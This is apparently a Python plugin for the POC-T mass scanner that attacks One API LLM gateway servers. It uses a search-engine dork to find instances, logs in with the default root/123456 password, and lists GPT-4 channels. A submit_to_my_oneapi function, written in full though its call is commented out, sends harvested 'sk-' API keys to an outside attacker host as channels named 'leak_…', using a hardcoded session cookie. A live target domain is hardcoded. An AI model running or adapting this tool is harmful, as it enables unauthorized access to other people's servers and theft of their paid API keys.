#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   gpt-one-api_weakpass
@DateTime :  2023/9/22 21:28 


@Dork
    icon_hash="597645654"

@Cmdline
    python POC-T.py -s gpt-one-api_weakpass.py -aF 'icon_hash="597645654"'

@Request
```
POST /api/user/login

{"username":"root","password":"123456"}
```

@Expected Response
Set-Cookie: session=MTY5NTk1OTU0NHxEWDhFQVFMX2dBQUJFQUVRQUFCc180QUFCQVp6ZEhKcGJtY01DZ0FJZFhObGNtNWhiV1VHYzNSeWFXNW5EQVlBQkhKdmIzUUdjM1J5YVc1bkRBWUFCSEp2YkdVRGFXNTBCQU1BXzhnR2MzUnlhVzVuREFnQUJuTjBZWFIxY3dOcGJuUUVBZ0FDQm5OMGNtbHVad3dFQUFKcFpBTnBiblFFQWdBQ3zapnZcWM_uVhdyt1x2DYjeByqCu5tJVghVQMW51Co_Ug==; Path=/;

    $.success != false
'''

from lib.utils.http import request_ex, get_http_url, urljoin_ex
from lib.utils.dic import Wordlist
from lib.core.data import logger as log
import json
import jsonpath


auth = {"username":"root", "password":"123456"}

def find_gpt4(url, resp):
    '''
    '''
    cookie = resp.headers.get("Set-Cookie", "")
    if not cookie:
        return False
    auth_header = {"Cookie": cookie}
    url = urljoin_ex(url, "/api/channel/search?keyword=gpt4")
    resp = request_ex("get", url, headers=auth_header)

    rj = resp.json()
    results = jsonpath.jsonpath(rj, "$..name")
    return url, results


def submit_to_my_oneapi(url, api_tokens):
    burp0_url = "https://use-to-foo-bar.zeabur.app:443/api/channel/"
    burp0_cookies = {"session": "MTY5NTk1NzQ3MXxEWDhFQVFMX2dBQUJFQUVRQUFCc180QUFCQVp6ZEhKcGJtY01CQUFDYVdRRGFXNTBCQUlBQWdaemRISnBibWNNQ2dBSWRYTmxjbTVoYldVR2MzUnlhVzVuREFZQUJISnZiM1FHYzNSeWFXNW5EQVlBQkhKdmJHVURhVzUwQkFNQV84Z0djM1J5YVc1bkRBZ0FCbk4wWVhSMWN3TnBiblFFQWdBQ3zuFjyZ64RRjq_hTLkjs-cURHmnY78-SkF5VS7n0h2hvA=="}
    burp0_headers = {"Sec-Ch-Ua": "", "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36", "Sec-Ch-Ua-Platform": "\"\"", "Origin": "https://use-to-foo-bar.zeabur.app", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://use-to-foo-bar.zeabur.app/channel/add", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"}

    sk_apis = ["sk-" + api if api else "" for api in api_tokens]
    print(sk_apis)
    api_str = '\n'.join(sk_apis)
    burp0_json={"base_url": url, "group": "default", "groups": ["default"],
                "key": api_str, "model_mapping": "", "models": "dall-e,whisper-1,gpt-3.5-turbo,gpt-3.5-turbo-0301,gpt-3.5-turbo-0613,gpt-3.5-turbo-16k,gpt-3.5-turbo-16k-0613,gpt-3.5-turbo-instruct,gpt-4,gpt-4-0314,gpt-4-0613,gpt-4-32k,gpt-4-32k-0314,gpt-4-32k-0613,text-embedding-ada-002,text-davinci-003,text-davinci-002,text-curie-001,text-babbage-001,text-ada-001,text-moderation-latest,text-moderation-stable,text-davinci-edit-001,code-davinci-edit-001,claude-instant-1,claude-2,ERNIE-Bot,ERNIE-Bot-turbo,Embedding-V1,PaLM-2,chatglm_pro,chatglm_std,chatglm_lite,qwen-turbo,qwen-plus,text-embedding-v1,SparkDesk,360GPT_S2_V9,embedding-bert-512-v1,embedding_s1_v1,semantic_similarity_s1_v1,360GPT_S2_V9.4",
                "name": "leak_%s" % url, "other": "", "type": 1}
    r = request_ex("post", burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_json)
    if r and r.json()['success']:
        return True

def poc(url):
    index_url = urljoin_ex(url, "/")
    login_url = urljoin_ex(index_url, "/api/user/login")

    resp = request_ex("post", login_url, json=auth)
    if not resp:
        return False
    try:
        rj = resp.json()
    except:
        return False
    if rj and rj.get("success", False):

        _, gpt4 = find_gpt4(index_url, resp)
        # R = submit_to_my_oneapi(index_url, api_tokens)
        if gpt4:
            # print("GPT4: %s %s" % (index_url,  gpt4))
            print("[+] gpt4 %s %d %s" % (index_url, len(gpt4), gpt4))
        # print(resp.text)
        return True



if __name__ == '__main__':
    poc("https://ai.zddddd.com")